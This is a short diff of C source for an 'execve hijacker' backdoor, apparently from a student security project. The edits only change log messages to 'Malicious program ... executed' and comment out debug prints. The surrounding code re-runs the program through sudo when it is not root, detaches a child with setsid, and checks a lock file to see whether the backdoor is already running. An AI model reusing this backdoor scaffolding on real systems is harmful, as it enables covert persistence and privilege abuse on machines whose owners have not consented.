@@ -263,9 +263,9 @@ int hijacker_process_routine(int argc, char* argv[], int fd){
 
 
 int main(int argc, char* argv[], char *envp[]){
-    printf("Hello world from execve hijacker\n");
+    printf("Malicious program execve hijacker executed\n");
     for(int ii=0; ii<argc; ii++){
-        printf("Argument %i is %s\n", ii, argv[ii]);
+        //printf("Argument %i is %s\n", ii, argv[ii]);
     }
 
     if(geteuid() != 0){
@@ -273,11 +273,11 @@ int main(int argc, char* argv[], char *envp[]){
         char* args[argc+3]; 
         args[0] = "sudo";
         args[1] = "/home/osboxes/TFG/src/helpers/execve_hijack";
-        printf("execve ARGS%i: %s\n", 0, args[0]);
-        printf("execve ARGS%i: %s\n", 1, args[1]);
+        //printf("execve ARGS%i: %s\n", 0, args[0]);
+        //printf("execve ARGS%i: %s\n", 1, args[1]);
         for(int ii=0; ii<argc; ii++){
             args[ii+2] = argv[ii];
-            printf("execve ARGS%i: %s\n", ii+2, args[ii+2]);
+            //printf("execve ARGS%i: %s\n", ii+2, args[ii+2]);
         }
         args[argc+2] = NULL;
         
@@ -299,7 +299,7 @@ int main(int argc, char* argv[], char *envp[]){
     if (pid == 0) {
         setsid();
         //Child process
-        printf("I am the child with pid %d\n", (int) getpid());
+        printf("Malicious program child executed with pid %d\n", (int) getpid());
 
         //First of all check if the locking log file is locked, which indicates that the backdoor process is already running
         int fd = open(LOCK_FILE, O_RDWR | O_CREAT | O_TRUNC, 0666);
